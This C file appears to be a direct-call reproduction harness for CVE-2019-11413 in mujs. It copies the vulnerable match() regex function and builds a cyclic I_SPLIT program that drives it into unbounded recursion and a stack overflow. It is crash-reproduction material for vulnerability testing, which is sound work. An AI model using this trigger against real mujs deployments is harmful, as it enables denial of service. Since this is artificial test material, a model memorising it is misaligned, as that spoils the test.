/* cve_barebone direct-call harness for mujs `match` (CVE-2019-11413, CWE-674).
 * Uncontrolled recursion in match() over an I_SPLIT program -> stack overflow,
 * ASAN-reported inside __asan_memcpy (the `scratch = *out;` Resub copy).
 *
 * Types and callees below are copied VERBATIM from the mujs source tree
 * (regexp.c / regexp.h / utf.c / utf.h) with their real names -- no project
 * headers, nothing invented. `match` itself is pasted byte-for-byte from
 * target/original_function.c. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

/* ---- utf.h : Rune ---- */
typedef unsigned short Rune;	/* 16 bits */

enum
{
	UTFmax		= 3,		/* maximum bytes per rune */
	Runesync	= 0x80,		/* cannot represent part of a UTF sequence (<) */
	Runeself	= 0x80,		/* rune and UTF sequences are the same (<) */
	Runeerror	= 0xFFFD,	/* decoding error in UTF */
};

/* ---- regexp.h : flags + Resub ---- */
typedef struct Resub Resub;

enum {
	/* regcomp flags */
	REG_ICASE = 1,
	REG_NEWLINE = 2,

	/* regexec flags */
	REG_NOTBOL = 4,

	/* limits */
	REG_MAXSUB = 10
};

struct Resub {
	int nsub;
	struct {
		const char *sp;
		const char *ep;
	} sub[REG_MAXSUB];
};

/* ---- regexp.c : Reclass, Reinst, opcode enum ---- */
typedef struct Reclass Reclass;
typedef struct Reinst Reinst;

struct Reclass {
	Rune *end;
	Rune spans[64];
};

enum {
	I_END, I_JUMP, I_SPLIT, I_PLA, I_NLA,
	I_ANYNL, I_ANY, I_CHAR, I_CCLASS, I_NCCLASS, I_REF,
	I_BOL, I_EOL, I_WORD, I_NWORD,
	I_LPAR, I_RPAR
};

struct Reinst {
	unsigned char opcode;
	unsigned char n;
	Rune c;
	Reclass *cc;
	Reinst *x;
	Reinst *y;
};

/* ---- utf.c : chartorune (verbatim) ---- */
typedef unsigned char uchar;

enum
{
	Bit1	= 7,
	Bitx	= 6,
	Bit2	= 5,
	Bit3	= 4,
	Bit4	= 3,

	T1	= ((1<<(Bit1+1))-1) ^ 0xFF,	/* 0000 0000 */
	Tx	= ((1<<(Bitx+1))-1) ^ 0xFF,	/* 1000 0000 */
	T2	= ((1<<(Bit2+1))-1) ^ 0xFF,	/* 1100 0000 */
	T3	= ((1<<(Bit3+1))-1) ^ 0xFF,	/* 1110 0000 */
	T4	= ((1<<(Bit4+1))-1) ^ 0xFF,	/* 1111 0000 */

	Rune1	= (1<<(Bit1+0*Bitx))-1,		/* 0000 0000 0111 1111 */
	Rune2	= (1<<(Bit2+1*Bitx))-1,		/* 0000 0111 1111 1111 */
	Rune3	= (1<<(Bit3+2*Bitx))-1,		/* 1111 1111 1111 1111 */

	Maskx	= (1<<Bitx)-1,			/* 0011 1111 */
	Testx	= Maskx ^ 0xFF,			/* 1100 0000 */

	Bad	= Runeerror,
};

int
chartorune(Rune *rune, const char *str)
{
	int c, c1, c2;
	int l;

	/*
	 * one character sequence
	 *	00000-0007F => T1
	 */
	c = *(uchar*)str;
	if(c < Tx) {
		*rune = c;
		return 1;
	}

	/*
	 * two character sequence
	 *	0080-07FF => T2 Tx
	 */
	c1 = *(uchar*)(str+1) ^ Tx;
	if(c1 & Testx)
		goto bad;
	if(c < T3) {
		if(c < T2)
			goto bad;
		l = ((c << Bitx) | c1) & Rune2;
		if(l <= Rune1)
			goto bad;
		*rune = l;
		return 2;
	}

	/*
	 * three character sequence
	 *	0800-FFFF => T3 Tx Tx
	 */
	c2 = *(uchar*)(str+2) ^ Tx;
	if(c2 & Testx)
		goto bad;
	if(c < T4) {
		l = ((((c << Bitx) | c1) << Bitx) | c2) & Rune3;
		if(l <= Rune2)
			goto bad;
		*rune = l;
		return 3;
	}

	/*
	 * bad decoding
	 */
bad:
	*rune = Bad;
	return 1;
}

/* ---- utftype.c : toupperrune -- minimal faithful ASCII stub (incidental:
 * only reached via REG_ICASE, which this harness never sets) ---- */
static Rune toupperrune(Rune c)
{
	if (c >= 'a' && c <= 'z')
		return c - 'a' + 'A';
	return c;
}

/* ---- regexp.c : canon (verbatim) ---- */
static int canon(Rune c)
{
	Rune u = toupperrune(c);
	if (c >= 128 && u < 128)
		return c;
	return u;
}

/* ---- regexp.c : isnewline (verbatim) ---- */
static int isnewline(int c)
{
	return c == 0xA || c == 0xD || c == 0x2028 || c == 0x2029;
}

/* ---- regexp.c : iswordchar (verbatim) ---- */
static int iswordchar(int c)
{
	return c == '_' ||
		(c >= 'a' && c <= 'z') ||
		(c >= 'A' && c <= 'Z') ||
		(c >= '0' && c <= '9');
}

/* ---- regexp.c : incclass (verbatim) ---- */
static int incclass(Reclass *cc, Rune c)
{
	Rune *p;
	for (p = cc->spans; p < cc->end; p += 2)
		if (p[0] <= c && c <= p[1])
			return 1;
	return 0;
}

/* ---- regexp.c : incclasscanon (verbatim) ---- */
static int incclasscanon(Reclass *cc, Rune c)
{
	Rune *p, r;
	for (p = cc->spans; p < cc->end; p += 2)
		for (r = p[0]; r <= p[1]; ++r)
			if (c == canon(r))
				return 1;
	return 0;
}

/* ---- regexp.c : strncmpcanon (verbatim) ---- */
static int strncmpcanon(const char *a, const char *b, int n)
{
	Rune ra, rb;
	int c;
	while (n--) {
		if (!*a) return -1;
		if (!*b) return 1;
		a += chartorune(&ra, a);
		b += chartorune(&rb, b);
		c = canon(ra) - canon(rb);
		if (c)
			return c;
	}
	return 0;
}

/* ================= TARGET FUNCTION (verbatim from target/original_function.c) ================= */
static int match(Reinst *pc, const char *sp, const char *bol, int flags, Resub *out)
{
	Resub scratch;
	int i;
	Rune c;

	for (;;) {
		switch (pc->opcode) {
		case I_END:
			return 1;
		case I_JUMP:
			pc = pc->x;
			break;
		case I_SPLIT:
			scratch = *out;
			if (match(pc->x, sp, bol, flags, &scratch)) {
				*out = scratch;
				return 1;
			}
			pc = pc->y;
			break;

		case I_PLA:
			if (!match(pc->x, sp, bol, flags, out))
				return 0;
			pc = pc->y;
			break;
		case I_NLA:
			scratch = *out;
			if (match(pc->x, sp, bol, flags, &scratch))
				return 0;
			pc = pc->y;
			break;

		case I_ANYNL:
			sp += chartorune(&c, sp);
			if (c == 0)
				return 0;
			pc = pc + 1;
			break;
		case I_ANY:
			sp += chartorune(&c, sp);
			if (c == 0)
				return 0;
			if (isnewline(c))
				return 0;
			pc = pc + 1;
			break;
		case I_CHAR:
			sp += chartorune(&c, sp);
			if (c == 0)
				return 0;
			if (flags & REG_ICASE)
				c = canon(c);
			if (c != pc->c)
				return 0;
			pc = pc + 1;
			break;
		case I_CCLASS:
			sp += chartorune(&c, sp);
			if (c == 0)
				return 0;
			if (flags & REG_ICASE) {
				if (!incclasscanon(pc->cc, canon(c)))
					return 0;
			} else {
				if (!incclass(pc->cc, c))
					return 0;
			}
			pc = pc + 1;
			break;
		case I_NCCLASS:
			sp += chartorune(&c, sp);
			if (c == 0)
				return 0;
			if (flags & REG_ICASE) {
				if (incclasscanon(pc->cc, canon(c)))
					return 0;
			} else {
				if (incclass(pc->cc, c))
					return 0;
			}
			pc = pc + 1;
			break;
		case I_REF:
			i = out->sub[pc->n].ep - out->sub[pc->n].sp;
			if (flags & REG_ICASE) {
				if (strncmpcanon(sp, out->sub[pc->n].sp, i))
					return 0;
			} else {
				if (strncmp(sp, out->sub[pc->n].sp, i))
					return 0;
			}
			if (i > 0)
				sp += i;
			pc = pc + 1;
			break;

		case I_BOL:
			if (sp == bol && !(flags & REG_NOTBOL)) {
				pc = pc + 1;
				break;
			}
			if (flags & REG_NEWLINE) {
				if (sp > bol && isnewline(sp[-1])) {
					pc = pc + 1;
					break;
				}
			}
			return 0;
		case I_EOL:
			if (*sp == 0) {
				pc = pc + 1;
				break;
			}
			if (flags & REG_NEWLINE) {
				if (isnewline(*sp)) {
					pc = pc + 1;
					break;
				}
			}
			return 0;
		case I_WORD:
			i = sp > bol && iswordchar(sp[-1]);
			i ^= iswordchar(sp[0]);
			if (!i)
				return 0;
			pc = pc + 1;
			break;
		case I_NWORD:
			i = sp > bol && iswordchar(sp[-1]);
			i ^= iswordchar(sp[0]);
			if (i)
				return 0;
			pc = pc + 1;
			break;

		case I_LPAR:
			out->sub[pc->n].sp = sp;
			pc = pc + 1;
			break;
		case I_RPAR:
			out->sub[pc->n].ep = sp;
			pc = pc + 1;
			break;
		default:
			return 0;
		}
	}
}

/* ================= direct-call driver ================= */

/* Cyclic I_SPLIT program: prog[i].x -> prog[(i+1)%k], prog[i].y -> I_END.
 * match() tries the .x branch first, which recurses without ever consuming
 * input or terminating -> unbounded recursion (CWE-674) -> stack overflow at
 * `scratch = *out;` (the Resub copy, __asan_memcpy). */
static Reinst *build_trigger(unsigned k)
{
	unsigned i;
	Reinst *prog;
	if (k < 1) k = 1;
	prog = (Reinst *)calloc(k + 1, sizeof(Reinst));
	for (i = 0; i < k; ++i) {
		prog[i].opcode = I_SPLIT;
		prog[i].x = &prog[(i + 1) % k];
		prog[i].y = &prog[k];
	}
	prog[k].opcode = I_END;
	return prog;
}

/* Finite I_SPLIT chain of depth k terminating at I_END: match() recurses k
 * deep down the .x branch, each level returns 1 -> unwinds cleanly. */
static Reinst *build_safe(unsigned k)
{
	unsigned i;
	Reinst *prog;
	if (k < 1) k = 1;
	prog = (Reinst *)calloc(k + 1, sizeof(Reinst));
	for (i = 0; i < k; ++i) {
		prog[i].opcode = I_SPLIT;
		prog[i].x = &prog[i + 1];
		prog[i].y = &prog[k];
	}
	prog[k].opcode = I_END;
	return prog;
}

int main(int argc, char **argv)
{
	FILE *f;
	long sz;
	size_t n;
	unsigned char *data;
	unsigned mode, k;
	Reinst *prog;
	char *sp;
	Resub *out;
	int r;

	if (argc < 2)
		return 0;
	f = fopen(argv[1], "rb");
	if (!f)
		return 0;
	fseek(f, 0, SEEK_END);
	sz = ftell(f);
	if (sz < 0)
		sz = 0;
	fseek(f, 0, SEEK_SET);
	/* HEAP-allocate the input so ASAN guards it (never a stack/static array). */
	data = (unsigned char *)malloc(sz ? (size_t)sz : 1);
	n = fread(data, 1, (size_t)sz, f);
	fclose(f);

	mode = (n >= 1) ? data[0] : 0u;
	k    = (n >= 2) ? data[1] : 3u;

	if (mode & 0x80u)
		prog = build_trigger((k & 0x07u) + 1u);   /* 1..8 node cycle -> infinite recursion */
	else
		prog = build_safe((k & 0x3fu) + 1u);      /* 1..64 deep finite chain -> safe */

	/* subject string on the heap (split-only programs never read it, but keep it real) */
	sp = (char *)malloc(n + 1);
	if (n)
		memcpy(sp, data, n);
	sp[n] = 0;

	out = (Resub *)calloc(1, sizeof(Resub));
	out->nsub = 1;

	r = match(prog, sp, sp, 0, out);

	if (r == 0x7fffffff)          /* keep the call observable */
		fprintf(stderr, "unreachable\n");

	free(prog);
	free(sp);
	free(out);
	free(data);
	return 0;
}
